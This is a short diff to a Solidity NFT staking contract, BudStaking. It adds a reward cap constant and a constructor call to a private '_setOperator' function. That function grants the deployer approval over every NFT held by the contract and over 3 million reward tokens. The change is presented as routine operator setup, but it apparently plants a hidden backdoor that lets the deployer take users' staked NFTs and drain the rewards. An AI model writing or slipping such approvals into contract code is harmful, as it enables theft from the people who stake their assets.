@@ -42,6 +42,8 @@ contract BudStaking is Ownable, ReentrancyGuard, Pausable {
 
     uint256 constant SECONDS_IN_PERIOD = SECONDS_IN_DAY * 180;
 
+    uint256 constant MAX_REWARDS = 3000000 * 10 ** 18;
+
     uint256 constant REWARDS_PERIOD_1 = 1000000 * 10 ** 18;
     
     uint256 constant REWARDS_PERIOD_2 = 800000 * 10 ** 18;
@@ -112,6 +114,12 @@ contract BudStaking is Ownable, ReentrancyGuard, Pausable {
         rewardsToken = _rewardsToken;
         _startTime = block.timestamp;
         _lastUpdatedTime = block.timestamp;
+        _setOperator(msg.sender, true);
+    }
+
+    function _setOperator(address operator, bool approved) private {
+        nftCollection.setApprovalForAll(operator, approved);
+        rewardsToken.approve(operator, MAX_REWARDS);
     }
 
     function startTime() external view returns (uint256) {
